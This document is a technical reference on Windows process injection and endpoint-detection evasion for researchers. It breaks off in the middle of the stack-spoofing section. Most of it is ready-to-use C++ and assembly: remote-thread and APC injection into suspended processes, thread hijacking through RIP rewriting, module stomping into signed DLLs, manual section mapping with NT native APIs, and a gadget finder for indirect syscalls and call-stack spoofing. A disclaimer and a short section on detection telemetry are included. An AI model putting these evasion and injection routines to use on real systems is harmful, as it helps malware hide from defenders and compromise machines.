# Windows Process Injection & Low-Level Evasion Techniques

## A Technical Reference for Security Researchers

---

**Scope & Disclaimer**

This document is a technical reference covering the Windows APIs, data structures, and x64 architecture concepts underlying process injection and defense-evasion techniques. It is intended for security researchers, malware analysts, detection engineers, and students of Windows internals operating in **authorized environments only** — dedicated lab machines, sanctioned red-team engagements, or defensive research. Executing any of these techniques against systems you do not own or lack written authorization to test is illegal in most jurisdictions.

**Prerequisites:** proficiency in C/C++, familiarity with basic Windows usage, and access to an x64 Windows 10/11 build for experimentation. All low-level material in Part III is x64-only.

---

# PART I — WINDOWS FUNDAMENTALS

## 1. Core Concepts

Everything in this reference rests on six ideas.

**1.1 Handles.** A `HANDLE` is an opaque token referring to a kernel object — a process, thread, file, or section. Handles are obtained from `Create*`/`Open*` calls and must be released with `CloseHandle`. `PROCESS_INFORMATION.hProcess`, a thread handle, and a section handle are all instances of the same idea.

**1.2 Error handling.** Nearly every Win32 API signals failure by returning `FALSE`/`NULL`/`INVALID_HANDLE_VALUE` and recording the cause in a thread-local error code:

```cpp
if (!SomeApi(...)) {
    fprintf(stderr, "[-] SomeApi failed: %lu\n", GetLastError());
}
```

Checking return values is not optional; many failures in this domain produce *silent* misbehavior rather than crashes.

**1.3 Naming conventions.**

| Suffix | Meaning |
|---|---|
| `Ex` | Extended variant. Critically, the `Ex` variants of memory/thread APIs take a process handle and operate in **another** process (`VirtualAlloc` → `VirtualAllocEx`, `CreateThread` → `CreateRemoteThread`). |
| `A` / `W` | ANSI vs. wide (UTF-16) string variants (`CreateProcessA` takes `char*`; `CreateFileW` takes `L"..."`). |

**1.4 Virtual memory.** Every process owns a private address space. Memory is *reserved*, then *committed*, and every region carries a **protection attribute** (RW, RX, RWX). Executable code requires committed memory with execute permission. Memory allocated via `VirtualAlloc` is *private committed* memory — not associated with any file on disk. This is conventionally called **unbacked memory**, and it is the single most important behavioral indicator in modern endpoint detection (see Part II §13).

**1.5 Processes and threads.** A *process* is an address space plus a set of handles. A *thread* is the unit that actually executes code. Each thread carries a **`CONTEXT`** — its saved CPU register state, including the instruction pointer (`RIP` on x64). A thread that can be suspended and have its `CONTEXT` rewritten can be redirected to execute any address — the basis of thread hijacking.

**1.6 API layering: kernel32 → ntdll → kernel.** `kernel32!CreateThread` is a thin wrapper over `ntdll!NtCreateThreadEx`, which performs the actual syscall. `ntdll` is the lowest documented user-mode layer. Techniques that resolve and call `ntdll` functions directly (`NtCreateSection`, `NtMapViewOfSection`, `NtCreateThreadEx`) bypass both the standard loader path and any user-mode monitoring installed above ntdll.

---

## 2. Constants Reference

**Memory protection** (used by `VirtualAlloc`, `VirtualProtect`, and NT equivalents):

```cpp
PAGE_READWRITE          0x04   // RW  — writable, not executable
PAGE_EXECUTE_READ       0x20   // RX  — executable, not writable (what legitimate code uses)
PAGE_EXECUTE_READWRITE  0x40   // RWX — writable AND executable; rare in legitimate software
```

**Allocation type** (always passed as the combination):

```cpp
MEM_COMMIT   0x1000
MEM_RESERVE  0x2000
```

**Process creation flags** (`CreateProcessA`):

```cpp
CREATE_SUSPENDED  0x4   // main thread starts frozen; resume via ResumeThread
DEBUG_PROCESS     0x1   // frozen + caller is the "debugger"; resume via DebugActiveProcessStop
```

**Access masks:**

```cpp
THREAD_ALL_ACCESS      // OpenThread
PROCESS_ALL_ACCESS     // OpenProcess on an existing PID
SECTION_ALL_ACCESS     // NtCreateSection
```

**Snapshots:**

```cpp
TH32CS_SNAPTHREAD  0x4   // system-wide thread snapshot
```

**Section allocation:**

```cpp
SEC_IMAGE  0x1000000   // map a file as an executable PE image
```

**Thread context:**

```cpp
CONTEXT_FULL   // combination macro; must be assigned to CONTEXT.ContextFlags
               // BEFORE calling GetThreadContext
```

---

## 3. Data Structures

### 3.1 `STARTUPINFOA` and `PROCESS_INFORMATION` — process creation

```cpp
STARTUPINFOA         Si;   // input: "how to start it"
PROCESS_INFORMATION  Pi;   // output: "what got started"

ZeroMemory(&Si, sizeof(Si));
Si.cb = sizeof(Si);         // REQUIRED — the API validates this size field
ZeroMemory(&Pi, sizeof(Pi));

// After a successful CreateProcessA:
Pi.hProcess     // HANDLE to the new process  → VirtualAllocEx, WriteProcessMemory, ...
Pi.hThread      // HANDLE to its main thread  → QueueUserAPC, ResumeThread
Pi.dwProcessId  // PID
Pi.dwThreadId   // main thread TID
```

Classic failure: omitting `ZeroMemory` or `Si.cb` causes `CreateProcessA` to fail with error 87 (invalid parameter).

### 3.2 `THREADENTRY32` — thread enumeration

```cpp
THREADENTRY32 Thr;
Thr.dwSize = sizeof(Thr);       // REQUIRED before the first iteration call

// Filled by Thread32First / Thread32Next:
Thr.th32ThreadID         // the TID
Thr.th32OwnerProcessID   // owning PID — use this to filter
```

### 3.3 `CONTEXT` — thread CPU state (x64)

```cpp
CONTEXT Ctx = {};
Ctx.ContextFlags = CONTEXT_FULL;    // set BEFORE GetThreadContext

// Key fields:
Ctx.Rip    // instruction pointer — the field thread hijacking overwrites
Ctx.Rsp    // stack pointer
Ctx.Rcx, Ctx.Rdx, Ctx.R8, Ctx.R9   // first four argument registers (x64 ABI)
```

On x86 the equivalent fields are `Eip`/`Esp`/`Ecx`. All context manipulation requires the target thread to be suspended.

### 3.4 PE structures — parsing a loaded module

```cpp
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
dos->e_magic;     // must be 0x5A4D ('MZ') — sanity check
dos->e_lfanew;    // file offset of the NT headers

PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((BYTE*)moduleBase + dos->e_lfanew);
nt->Signature;                           // 'PE\0\0'
nt->FileHeader.NumberOfSections;         // number of section headers
nt->OptionalHeader.AddressOfEntryPoint;  // RVA of the entry point

PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
// iterate: sec->Name (".text"), sec->VirtualAddress (RVA), sec->Misc.VirtualSize
```

**RVA (Relative Virtual Address):** an offset from a module's base address. Every PE-derived address in memory is computed as `(BYTE*)base + rva`. This pattern recurs in section mapping, module stomping, and gadget hunting.

---

## 4. API Reference by Family

Headers: `<Windows.h>` covers nearly everything; add `<tlhelp32.h>` for snapshots. NT native APIs require manual declarations (§4.6).

### 4.1 Memory — local process

**`VirtualAlloc`** — reserve and commit memory with a protection:

```cpp
LPVOID VirtualAlloc(
    LPVOID lpAddress,          // NULL = system chooses the address
    SIZE_T dwSize,             // bytes
    DWORD  flAllocationType,   // MEM_COMMIT | MEM_RESERVE
    DWORD  flProtect           // PAGE_READWRITE / PAGE_EXECUTE_READ / PAGE_EXECUTE_READWRITE
);
// Returns the base address, or NULL on failure.
```

This is the canonical source of unbacked memory (Part II §13).

**`VirtualProtect`** — change the protection of existing memory:

```cpp
BOOL VirtualProtect(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,        // desired protection
    PDWORD lpflOldProtect       // OUT: previous protection — required parameter
);
```

The standard pattern is allocate as RW → copy code in → flip to RX. The out-parameter must be the address of a valid `DWORD` (passing `NULL` fails the call); it is also used to *restore* the original protection after modification.

**`memcpy`** — the standard copy primitive, local process only:

```cpp
memcpy(destination, source, size);
// Cannot reach into another process's address space — that is WriteProcessMemory's role.
```

### 4.2 Execution — local process

**Function-pointer cast** — the most primitive execution mechanism:

```cpp
((void(*)())execMem)();
```

Casts the memory address to a function pointer and calls it. Execution occurs on the **calling thread** — no new thread is created. This is the baseline against which all other execution techniques are compared.

**`CreateThread`** — spawn a thread starting at an arbitrary address:

```cpp
HANDLE CreateThread(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,   // NULL
    SIZE_T                  dwStackSize,          // 0 = default
    LPTHREAD_START_ROUTINE  lpStartAddress,       // (LPTHREAD_START_ROUTINE)execMem
    LPVOID                  lpParameter,          // NULL
    DWORD                   dwCreationFlags,      // 0 = run immediately
    LPDWORD                 lpThreadId            // &threadId, or NULL
);
```

The final parameter is an **out-parameter**: pass the address of a real `DWORD` or `NULL` — never an uninitialized pointer (the API writes to it, causing an access violation if invalid).

```cpp
DWORD threadId = 0;
HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, &threadId);
WaitForSingleObject(hThread, INFINITE);   // block until the thread's routine returns
CloseHandle(hThread);
```

**Fiber APIs** — user-mode cooperative "threads" sharing one OS thread:

```cpp
LPVOID ConvertThreadToFiber(LPVOID lpParameter);   // NULL
// Converts the CALLING thread into a fiber. Mandatory first step.

LPVOID CreateFiber(
    SIZE_T                 dwStackSize,        // 0 = default
    LPFIBER_START_ROUTINE  lpStartAddress,     // (LPFIBER_START_ROUTINE)execMem
    LPVOID                 lpParameter         // NULL
);
// Builds a fiber context; does NOT begin execution.

VOID SwitchToFiber(LPVOID lpFiber);      // SwitchToFiber(payloadFiber);
// Transfers execution. Entirely user-mode — no kernel transition.
```

Sequence: `ConvertThreadToFiber(NULL)` → `CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL)` → `SwitchToFiber(payloadFiber)`. Because fibers share the host thread's TID and never appear in thread listings, they are substantially less visible to thread-centric monitoring than `CreateThread`.

### 4.3 Cross-process — the "remote" family

**`CreateProcessA`** — spawn a new process:

```cpp
BOOL CreateProcessA(
    LPCSTR                 lpApplicationName,     // NULL
    LPSTR                  lpCommandLine,         // full path, e.g. "C:\\Windows\\System32\\notepad.exe"
    LPSECURITY_ATTRIBUTES  lpProcessAttributes,   // NULL
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,    // NULL
    BOOL                   bInheritHandles,       // FALSE
    DWORD                  dwCreationFlags,       // CREATE_SUSPENDED or DEBUG_PROCESS
    LPVOID                 lpEnvironment,         // NULL
    LPCSTR                 lpCurrentDirectory,    // NULL
    LPSTARTUPINFOA         lpStartupInfo,         // &Si
    LPPROCESS_INFORMATION  lpProcessInformation   // &Pi — handles returned here
);
```

Creation with `CREATE_SUSPENDED` or `DEBUG_PROCESS` freezes the target **before any of its code runs**, giving the caller a window in which to inject. The matching resume call depends on the flag used:

| Creation flag | Resume call |
|---|---|
| `CREATE_SUSPENDED` | `ResumeThread(pi.hThread)` |
| `DEBUG_PROCESS` | `DebugActiveProcessStop(pi.dwProcessId)` |

Failing to resume leaves the target permanently hung — the most common "nothing happened" outcome in injection development.

**`VirtualAllocEx`** — allocate memory **inside the target process**:

```cpp
LPVOID VirtualAllocEx(
    HANDLE hProcess,           // target process handle
    LPVOID lpAddress,          // NULL
    SIZE_T dwSize,
    DWORD  flAllocationType,   // MEM_COMMIT | MEM_RESERVE
    DWORD  flProtect           // PAGE_READWRITE (flip later via VirtualProtectEx)
);
// The returned address is valid in the TARGET's address space; the calling
// process cannot access it directly.
```

**`WriteProcessMemory`** — copy bytes into the target:

```cpp
BOOL WriteProcessMemory(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,           // address returned by VirtualAllocEx
    LPCVOID lpBuffer,                // source buffer
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten  // &written
);
```

The most frequent remote-injection error is using `memcpy` here: `memcpy` writes into the *caller's* address space and silently does nothing useful for the target. Only this API (via the kernel) can cross the process boundary.

**`VirtualProtectEx`** — change protection inside the target:

```cpp
BOOL VirtualProtectEx(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,       // e.g. PAGE_EXECUTE_READWRITE
    PDWORD lpflOldProtect
);
```

**`CreateRemoteThread`** — create a thread inside the target:

```cpp
HANDLE CreateRemoteThread(
    HANDLE                  hProcess,        // target process
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,  // (LPTHREAD_START_ROUTINE)remoteMem
    LPVOID                  lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
);
```

Structurally identical to `CreateThread` with a process handle prepended. This API is among the most heavily monitored in the Windows API surface.

**`QueueUserAPC`** — queue a callback onto an existing thread:

```cpp
DWORD QueueUserAPC(
    PAPCFUNC  pfnAPC,     // (PAPCFUNC)remoteAddress — shellcode as "callback"
    HANDLE    hThread,    // target thread handle
    ULONG_PTR dwData      // becomes the callback's argument
);
```

This does **not** execute anything immediately. It places a user APC in the thread's queue; the callback runs when that thread enters an **alertable wait state** — i.e., calls `SleepEx`, `WaitForSingleObjectEx`, `WaitForMultipleObjectsEx`, or `MsgWaitForMultipleObjectsEx` with the alertable flag set. A freshly created frozen process passes through alertable points during early startup, immediately after being resumed — which is what makes the *create-suspended → queue APC → resume* pattern reliable ("Early Bird"-style injection). Queuing to an arbitrary existing thread that never sleeps alertably results in a payload that never executes.

**Resume pair:**

```cpp
DWORD ResumeThread(HANDLE hThread);                 // unfreeze (CREATE_SUSPENDED)
BOOL  DebugActiveProcessStop(DWORD dwProcessId);    // detach (DEBUG_PROCESS)
```

### 4.4 Thread enumeration and hijacking

**Snapshot and iteration:**

```cpp
HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) — all threads system-wide

BOOL Thread32First(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
BOOL Thread32Next (HANDLE hSnapshot, LPTHREADENTRY32 lpte);
```

Canonical loop:

```cpp
THREADENTRY32 Thr{};
Thr.dwSize = sizeof(Thr);
if (Thread32First(hSnap, &Thr)) {
    do {
        if (Thr.th32OwnerProcessID == targetPid &&
            Thr.th32ThreadID != GetCurrentThreadId()) {
            // candidate thread
        }
    } while (Thread32Next(hSnap, &Thr));
}
CloseHandle(hSnap);
```

**`OpenThread`** — acquire a handle to another thread:

```cpp
HANDLE OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
// OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
```

**The hijack core** — suspend, rewrite the instruction pointer, resume:

```cpp
SuspendThread(hThread);                 // REQUIRED before touching CONTEXT

CONTEXT Ctx = {};
Ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(hThread, &Ctx);

Ctx.Rip = (ULONG_PTR)execMem;           // THE hijack — redirect execution
                                        // (x86: Ctx.Eip)

SetThreadContext(hThread, &Ctx);
ResumeThread(hThread);                  // thread resumes at the new RIP
```

**Why it works:** a suspended thread's entire CPU state is materialized in the `CONTEXT` structure. On resume, the loader restores registers from `CONTEXT`, so execution continues from whatever address `RIP` holds. Because this technique creates no thread and calls neither `CreateThread` nor `CreateRemoteThread`, it sidesteps thread-creation monitoring entirely. A common local variant creates one's own `CREATE_SUSPENDED` thread running a dummy function, then enumerates and hijacks it.

### 4.5 Modules — the basis of module stomping

```cpp
HMODULE LoadLibraryA(LPCSTR lpLibFileName);
// LoadLibraryA("combase.dll") — loads a legitimate, signed DLL into the process.
// Its mapped image is now "backed" by the file on disk.

FARPROC GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// GetProcAddress(hModule, "CStdStubBuffer_AddRef") — address of a specific
// function inside the DLL, used as the overwrite target.
```

Module stomping sequence:

```cpp
HMODULE hModule = LoadLibraryA("combase.dll");
PVOID   pTarget = (PVOID)GetProcAddress(hModule, "CStdStubBuffer_AddRef");

DWORD oldProtect;
VirtualProtect(pTarget, payloadSize, PAGE_READWRITE, &oldProtect); // make writable
memcpy(pTarget, payloadData, payloadSize);                         // overwrite code
VirtualProtect(pTarget, payloadSize, oldProtect, &oldProtect);     // restore RX

HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pTarget, NULL, 0, NULL);
```

Execution now originates from memory mapped by a legitimate on-disk module: the code region is backed, `GetMappedFileName`-style queries return a real DLL path, and call-stack return addresses resolve to a signed module. Candidate sacrificial DLLs are chosen for a large `.text` section and innocuous presence — commonly `mshtml.dll` (~11 MB), `edgehtml.dll` (~12 MB), `combase.dll` (~0.94 MB). The target function must be large enough to hold the payload.

### 4.6 NT native APIs — direct kernel-interface calls

These functions are not declared in standard headers; resolve them at runtime from `ntdll.dll`:

```cpp
using NtCreateSection_t = NTSTATUS (NTAPI*)(
    PHANDLE             SectionHandle,          // OUT: &hSection
    ACCESS_MASK         DesiredAccess,          // SECTION_ALL_ACCESS
    POBJECT_ATTRIBUTES  ObjectAttributes,       // NULL
    PLARGE_INTEGER      MaximumSize,            // NULL
    ULONG               SectionPageProtection,  // PAGE_READONLY
    ULONG               AllocationAttributes,   // SEC_IMAGE
    HANDLE              FileHandle);            // file handle (see below)

using NtMapViewOfSection_t = NTSTATUS (NTAPI*)(
    HANDLE          SectionHandle,
    HANDLE          ProcessHandle,       // (HANDLE)-1 = current process
    PVOID           *BaseAddress,        // OUT — initialize to NULL first
    ULONG_PTR       ZeroBits,            // 0
    SIZE_T          CommitSize,          // 0
    PLARGE_INTEGER  SectionOffset,       // NULL
    PSIZE_T         ViewSize,            // OUT — initialize to 0
    DWORD           InheritDisposition,  // ViewShare (1)
    ULONG           AllocationType,      // 0
    ULONG           Win32Protect);       // PAGE_EXECUTE_READWRITE

using NtAllocateVirtualMemory_t = NTSTATUS (NTAPI*)(
    HANDLE  ProcessHandle,     // (HANDLE)-1 = current process
    PVOID*  BaseAddress,       // IN/OUT pointer-to-pointer — updated on return
    PVOID   ZeroBits,          // NULL
    PSIZE_T RegionSize,        // IN/OUT pointer-to-size — page-rounded on return
    ULONG   AllocationType,    // MEM_COMMIT | MEM_RESERVE
    ULONG   Protect);          // PAGE_READWRITE

using NtProtectVirtualMemory_t = NTSTATUS (NTAPI*)(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,       // IN/OUT — aligned DOWN to page boundary
    PSIZE_T RegionSize,        // IN/OUT — rounded UP to region size
    ULONG   NewProtect,
    PULONG  OldProtect);       // OUT

using NtCreateThreadEx_t = NTSTATUS (NTAPI*)(
    PHANDLE   ThreadHandle,        // OUT
    ACCESS_MASK DesiredAccess,       // THREAD_ALL_ACCESS
    POBJECT_ATTRIBUTES,              // NULL
    HANDLE    ProcessHandle,         // (HANDLE)-1
    PVOID     StartRoutine,
    PVOID     Argument,              // NULL
    ULONG     CreateFlags,           // 0
    SIZE_T    ZeroBits,              // 0
    SIZE_T    StackSize,             // 0
    SIZE_T    MaximumStackSize,      // 0
    PVOID     AttributeList);        // NULL

auto NtCreateSection = (NtCreateSection_t)GetProcAddress(
    GetModuleHandleA("ntdll.dll"), "NtCreateSection");
// ... similarly for the others.
```

**Critical semantic differences from the Win32 layer:**

- NT functions return `NTSTATUS` (`STATUS_SUCCESS` == 0), not `BOOL`.
- `NtAllocateVirtualMemory` and `NtProtectVirtualMemory` take **pointers to** the base address and region size, and **modify both** (page alignment). After any such call, the caller must re-set `baseAddress`/`regionSize` before a subsequent call operating on the same region — otherwise the second call operates on the wrong, page-rounded values.

Supporting file API:

```cpp
HANDLE hFile = CreateFileW(
    L"C:\\Windows\\System32\\combase.dll",
    GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
// Section mapping: open file → NtCreateSection (SEC_IMAGE) → file handle may
// be closed immediately → NtMapViewOfSection into the process.
```

**Section-mapping sequence:**

```cpp
HANDLE hFile = CreateFileW(L"...decoy.dll", GENERIC_READ, 0, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
HANDLE hSection;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
                PAGE_READONLY, SEC_IMAGE, hFile);
CloseHandle(hFile);

PVOID  base     = NULL;   // MUST be NULL-initialized
SIZE_T viewSize = 0;      // MUST be zero-initialized
NtMapViewOfSection(hSection, (HANDLE)-1, &base, 0, 0, NULL,
                   &viewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);

// Parse PE headers (§3.4) → locate entry point / .text
// VirtualProtect(entry, size, PAGE_READWRITE, &old) → memcpy → restore
NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
                 entryPoint, NULL, 0, 0, 0, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
```

**Rationale:** mapping via `NtCreateSection`/`NtMapViewOfSection` bypasses the standard loader (`LoadLibrary`), so the mapped module never registers CFG rules with the loader, never triggers standard image-load notifications in the same way, and does not appear in PEB module lists — invisible to common module-enumeration tooling.

### 4.7 Utilities

```cpp
WaitForSingleObject(HANDLE h, DWORD ms);   // INFINITE = block until signaled
CloseHandle(HANDLE h);                     // release any handle
GetLastError();                            // retrieve failure cause
GetEnvironmentVariableA("WINDIR", buf, MAX_PATH);  // resolve the Windows directory
sprintf_s(dst, sizeof(dst), "...", ...);   // bounded formatting
ZeroMemory(&Struct, sizeof(Struct));       // zero-initialization
MAX_PATH                                   // 260 — conventional path buffer size
```

---

# PART II — TECHNIQUE COMPENDIUM

## 5. The Common Structure

Every injection technique is a variation of four verbs:

> **obtain executable memory → place code in it → make it executable → transfer execution to it.**

Techniques differ along two axes: *which* memory holds the code (unbacked private memory vs. memory backed by a legitimate on-disk file) and *how* execution begins (calling thread, new thread, remote thread, APC, hijacked register state, fiber).

## 6. Technique Summaries

| Technique | Memory used | Execution mechanism | Notable APIs |
|---|---|---|---|
| Inline execution | Unbacked (`VirtualAlloc`, RWX) | Calling thread (function-pointer call) | `VirtualAlloc`, `memcpy` |
| Thread execution | Unbacked (RW → RX) | New local thread | `+ VirtualProtect`, `CreateThread` |
| Remote injection | Unbacked in target | New thread in target | `CreateProcessA`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx`, `CreateRemoteThread` |
| APC injection | Unbacked in target | Target's existing main thread (queued APC) | `+ QueueUserAPC`, `ResumeThread`/`DebugActiveProcessStop` |
| Thread hijacking | Unbacked | Existing thread, redirected `RIP` | `CreateToolhelp32Snapshot`, `OpenThread`, `SuspendThread`, `Get/SetThreadContext`, `ResumeThread` |
| Fiber execution | Unbacked (RW → RX) | Fiber switch (user-mode) | `ConvertThreadToFiber`, `CreateFiber`, `SwitchToFiber` |
| Module stomping | **Backed** (legitimate DLL) | Thread starting inside the DLL | `LoadLibraryA`, `GetProcAddress`, `VirtualProtect`, `memcpy` |
| Section mapping | **Backed** (manually mapped DLL) | Native thread creation | `CreateFileW`, `NtCreateSection`, `NtMapViewOfSection`, `NtCreateThreadEx` |
| Stack spoofing | (orthogonal) | Disguised call stack for any of the above | Assembly trampoline + ntdll gadget (Part III) |
| Indirect syscalls | (orthogonal) | Syscall executed from within ntdll | Assembly stub + `syscall;ret` gadget (Part III) |

Stealth-oriented combinations stack these: e.g., module stomping (backed memory) + indirect syscalls (no user-mode API path) + stack spoofing (clean call stack) addresses the three primary behavioral indicators simultaneously.

## 7. Behavioral Detection Principles

Modern endpoint detection platforms do not primarily rely on signatures for these techniques; they rely on **behavioral telemetry** — largely sourced from kernel callbacks (`PsSetCreateProcessNotifyRoutine`, `PsSetCreateThreadNotifyRoutine`, `PsSetLoadImageNotifyRoutine`, `ObRegisterCallbacks`, `CmRegisterCallback`) and **ETW** (Event Tracing for Windows), including the restricted `Microsoft-Windows-Threat-Intelligence` provider, which captures call stacks directly from the kernel. The recurring indicators:

1. **Unbacked memory execution** — code running in `MEM_PRIVATE` committed regions with no file backing; detected both directly and via call-stack analysis (return addresses resolving to no module).
2. **Suspicious memory-protection transitions** — RW → RX / RWX sequences on private memory, particularly followed by execution; `VirtualProtect`/`NtProtectVirtualMemory` is a heavily instrumented call.
3. **Cross-process operations** — `OpenProcess` with broad rights, `VirtualAllocEx`, `WriteProcessMemory` into trusted, signed targets.
4. **Thread creation anomalies** — threads whose start address lies in unbacked memory; suspension/context manipulation of threads (`SuspendThread`/`SetThreadContext`).
5. **Call-stack anomalies** — return addresses pointing into non-image memory, or flows that violate the expected module chain (e.g., `ntdll → KernelBase → ntdll` implies a gadget-mediated call); public behavioral rules (Elastic, Sigma community) encode many of these patterns.

A critical calibration point for researchers: **user-mode call-stack manipulation does not affect kernel-side ETW-TI telemetry**, which collects stack traces in the kernel independent of user-mode stack contents. Techniques in this document primarily target user-mode telemetry and hooking; a platform consuming ETW-TI call stacks retains significant visibility. Any assessment of an evasion technique must state which telemetry layer it addresses.

---

# PART III — x64 ARCHITECTURE, GADGETS, STACK SPOOFING, AND INDIRECT SYSCALLS

## 8. The x64 ABI (Prerequisite)

**8.1 Registers.**

| Register | Role | Preserved across calls? |
|---|---|---|
| `rcx, rdx, r8, r9` | Arguments 1–4 | No (volatile) |
| `rax` | Return value | No |
| `r10` | Argument-1 slot for syscalls (§8.4) | No |
| `r11` | Scratch — clobbered by `syscall` | No |
| `rbx, rbp, rdi, rsi, r12–r15` | Callee-saved | **Yes (non-volatile)** |
| `rsp` | Stack pointer | Managed |
| `rip` | Instruction pointer | — |

Non-volatile registers abused by assembly stubs must be saved and restored, or C++ code following the call will operate on corrupted state.

**8.2 Stack layout at function entry.**

```
 caller executed:  call Patch(arg1, arg2, ..., argN)

rsp → ┌───────────────────────────┐ +0x00
      │ return address → caller   │   ← popped by `ret`
      ├───────────────────────────┤ +0x08
      │ shadow space: arg1 home   │
      │ shadow space: arg2 home   │
      │ shadow space: arg3 home   │
      │ shadow space: arg4 home   │
      ├───────────────────────────┤ +0x28
      │ arg5                      │   ← 5th and later arguments
      │ arg6                      │ +0x30   live on the stack
      │ arg7                      │ +0x38
      └───────────────────────────┘
```

This layout explains stack-based argument access (`mov r11, [rsp + 0x38]` retrieves a 7th argument) and argument "shifting": when a wrapper's own parameters consume the register slots, the callee's real arguments arrive shifted, e.g., `mov rcx, r9` moves the wrapper's 4th parameter into the first-argument position.

**8.3 The three instructions underlying stack manipulation.**

```asm
call target   ; pushes the address of the NEXT instruction onto [rsp], then jumps.
              ; The pushed value IS the return address observers read off the stack.
jmp  target   ; jumps. Nothing is pushed — the stack top is whatever the code placed there.
ret           ; pops [rsp] into rip — jumps to whatever is on top of the stack.
```

**8.4 Syscalls.** Every `Nt*` function in ntdll is a stub:

```asm
NtProtectVirtualMemory:
    mov r10, rcx      ; mandatory: `syscall` destroys rcx (it stores RIP there);
    mov eax, 50h      ; the kernel reads argument 1 from r10 instead
    syscall           ; kernel transition; SSN in eax selects the service
    ret
```

- **SSN (syscall number)**: the constant loaded into `eax`. Values are **build-specific** (e.g., `0x18` for `NtAllocateVirtualMemory` and `0x50` for `NtProtectVirtualMemory` on many Windows 10/11 builds; verify against the target build — disassemble the ntdll stub and read the `mov eax, imm32`).
- **Direct syscall**: the `mov r10,rcx; mov eax,SSN; syscall` sequence executes from one's own memory. Bypasses user-mode hooks, but the calling address is unbacked and observable in kernel telemetry.
- **Indirect syscall**: registers are prepared, then execution `jmp`s to a borrowed **`syscall; ret`** byte sequence *inside ntdll*. The `ret` after `syscall` pops the planted return address, so execution "returns into ntdll" and `KernelBase` never appears in the stack.

**8.5 Instruction decoder** for the assembly in this part:

| Instruction | Meaning |
|---|---|
| `mov r10, rcx` | register → register copy |
| `mov [rsp + 0x8], rsi` | register → **memory** (brackets denote memory operands) |
| `mov rdx, [rsp + 0x300 + 0x28]` | memory → register (loading a saved argument) |
| `mov eax, 18h` | load constant (SSN) |
| `sub rsp, 0x100` | reserve stack space (stack grows downward) |
| `add rsp, 0x300` | release stack space |
| `lea r12, Fixup` | r12 = address of label `Fixup` |
| `cmp rdx, 4` / `jle label` | compare / conditional jump (≤4 args → no stack args to shift) |
| `jmp r10` | indirect jump through register |
| `call r12` | push return address; jump through r12 |
| `syscall` / `int 3` | kernel transition / breakpoint (`0xCC`) |

## 9. Gadgets

A **gadget** is a short instruction sequence that happens to exist at an unaligned offset inside a legitimate module's code. The enclosing function is irrelevant; only the byte pattern matters. Two gadget classes support these techniques, both hunted at runtime within ntdll's `.text` section:

| Gadget | Bytes | Purpose |
|---|---|---|
| `syscall; ret` | `0F 05 C3` | Indirect syscall — the kernel transition executes "from ntdll" |
| `call r12` | `41 FF D4` | Stack-spoof return — after the target function returns into it, it pushes a genuine ntdll address onto the stack and chains to the fixup routine |

Gadget addresses must be resolved at runtime every execution — ASLR and build differences relocate them. The search reuses PE-parsing logic (§3.4):

```cpp
#include <Windows.h>
#include <cstring>

// Return the VA of the first byte-pattern hit within a module's .text section.
PVOID FindGadget(HMODULE mod, const BYTE* pattern, size_t len) {
    auto dos = (PIMAGE_DOS_HEADER)mod;
    auto nt  = (PIMAGE_NT_HEADERS64)((BYTE*)mod + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (unsigned i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;
        BYTE* base = (BYTE*)mod + sec->VirtualAddress;   // RVA → VA
        for (DWORD off = 0; off + len <= sec->Misc.VirtualSize; off++)
            if (!memcmp(base + off, pattern, len))
                return base + off;
    }
    return nullptr;
}

PVOID syscallGadget = FindGadget(GetModuleHandleA("ntdll.dll"),
                                 (const BYTE*)"\x0F\x05\xC3", 3);
PVOID callR12Gadget = FindGadget(GetModuleHandleA("ntdll.dll"),
                                 (const BYTE*)"\x41\xFF\xD4", 3);
```

Note that gadget choice itself is detectable: rules exist that match well-known gadgets (e.g., sequences inside `NtTestAlert`) on the call stack, and others that flag any return destination whose trailing bytes decode as a register jump/call. Less-common gadgets reduce this exposure.

## 10. Stack Spoofing — Mechanics

**Problem.** When a sensitive API (e.g., `VirtualProtect`) is invoked via a normal `call` from dynamically allocated memory, the captured call stack contains the caller's unbacked address (`<module>+0x…`), which behavioral rules flag.

**Mechanism.** Because a call stack is just a chain of return addresses planted by `call` instructions, a trampoline can instead `jmp` to the target after planting a chosen return address on the stack:

```
C++ caller
   │  Patch(targetStub, nArgs, spoofGadget, <NT arguments...>, syscallGadget)
   ▼
── ASSEMBLY TRAMPOLINE ────────────────────────────────────────
sub  rsp, 0x100            ; workspace
